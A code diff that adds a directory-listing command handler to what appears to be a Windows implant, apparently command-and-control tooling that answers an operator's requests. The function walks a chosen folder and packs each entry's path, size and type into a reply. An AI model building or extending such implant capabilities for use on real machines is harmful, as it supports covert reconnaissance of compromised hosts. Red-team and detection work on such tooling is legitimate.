@@ -494,6 +494,155 @@ DWORD CmdGetPid(
 	return status;
 }
 
+DWORD CmdLs(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR basePath = NULL;
+	WCHAR searchPath[MAX_PATH];
+	WIN32_FIND_DATAW ffd;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+
+	PBYTE responseBuffer = NULL;
+	// start with a 64KB buffer. It will dynamically grow if the directory is huge.
+	DWORD bufferCapacity = 65536;
+	DWORD currentOffset = 0;
+	DWORD numEntries = 0;
+
+	if (responseData != NULL) *responseData = NULL;
+	if (responseLen != NULL) *responseLen = 0;
+
+	// convert the input from the operator into a wide string
+	status = ConvertUtf8ToWideString(dataLen, data, &basePath);
+	if (status != NO_ERROR) {
+		return status;
+	}
+
+	// prepare search path (basePath + \*)
+	if (FAILED(StringCchCopyW(searchPath, MAX_PATH, basePath)) ||
+		FAILED(StringCchCatW(searchPath, MAX_PATH, L"\\*")))
+	{
+		status = ERROR_INVALID_PARAMETER;
+		goto cleanup;
+	}
+
+	// allocate initial payload buffer
+	responseBuffer = (PBYTE)ImplantHeapAlloc(bufferCapacity);
+	if (responseBuffer == NULL)
+	{
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// reserve the first 4 bytes for the numEntries DWORD
+	currentOffset = sizeof(DWORD);
+
+	// traverse directory
+	hFind = FindFirstFileW(searchPath, &ffd);
+	if (hFind == INVALID_HANDLE_VALUE)
+	{
+		status = GetLastError();
+		goto cleanup;
+	}
+
+	do
+	{
+		// skip the current directory "." and parent directory ".." entries
+		if (wcscmp(ffd.cFileName, L".") != 0 && wcscmp(ffd.cFileName, L"..") != 0)
+		{
+			WCHAR fullFilePath[MAX_PATH];
+			StringCchPrintfW(fullFilePath, MAX_PATH, L"%s\\%s", basePath, ffd.cFileName);
+
+			DWORD nameBytes = (DWORD)(wcslen(fullFilePath) + 1) * sizeof(WCHAR);
+			DWORD isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
+
+			LARGE_INTEGER filesize;
+			filesize.LowPart = ffd.nFileSizeLow;
+			filesize.HighPart = ffd.nFileSizeHigh;
+
+			// size required for this exact file/folder
+			DWORD bytesNeeded = sizeof(DWORD) + sizeof(ULONGLONG) + sizeof(DWORD) + nameBytes;
+
+			// dynamically resize buffer if we are running out of space
+			if (currentOffset + bytesNeeded > bufferCapacity)
+			{
+				DWORD newCapacity = bufferCapacity * 2;
+				PBYTE newBuffer = (PBYTE)ImplantHeapAlloc(newCapacity);
+				if (newBuffer == NULL)
+				{
+					status = ERROR_MEMORY_ALLOCATION_FAILED;
+					goto cleanup;
+				}
+				// copy old data into new expanded buffer, then free the old one
+				memcpy(newBuffer, responseBuffer, currentOffset);
+				ImplantHeapFree(responseBuffer);
+				responseBuffer = newBuffer;
+				bufferCapacity = newCapacity;
+			}
+
+			// pack the data sequentially
+			PBYTE writePtr = responseBuffer + currentOffset;
+
+			// Pack Is Directory flag
+			*((DWORD*)writePtr) = isDir;
+			writePtr += sizeof(DWORD);
+
+			// Pack File Size
+			*((ULONGLONG*)writePtr) = filesize.QuadPart;
+			writePtr += sizeof(ULONGLONG);
+
+			// Pack Name Length
+			*((DWORD*)writePtr) = nameBytes;
+			writePtr += sizeof(DWORD);
+
+			// Pack Absolute Path String
+			memcpy(writePtr, fullFilePath, nameBytes);
+
+			currentOffset += bytesNeeded;
+			numEntries++;
+		}
+	} while (FindNextFileW(hFind, &ffd) != 0);
+
+	// check if enumeration failed midway due to permissions
+	DWORD dwError = GetLastError();
+	if (dwError != ERROR_NO_MORE_FILES)
+	{
+		status = dwError;
+		goto cleanup;
+	}
+
+	// write the total number of entries found at the very beginning
+	*((DWORD*)responseBuffer) = numEntries;
+
+	// Assign output pointers
+	*responseData = responseBuffer;
+	*responseLen = currentOffset;
+
+cleanup:
+	if (hFind != INVALID_HANDLE_VALUE)
+	{
+		FindClose(hFind);
+	}
+	if (basePath != NULL)
+	{
+		ImplantHeapFree(basePath);
+	}
+
+	// clean up on failure so we don't leak memory
+	if (status != NO_ERROR && responseBuffer != NULL)
+	{
+		ImplantHeapFree(responseBuffer);
+		if (responseData != NULL) *responseData = NULL;
+		if (responseLen != NULL) *responseLen = 0;
+	}
+
+	return status;
+}
+
 DWORD ExecuteCommandById(
 	DWORD cmdId,
 	DWORD dataLen,
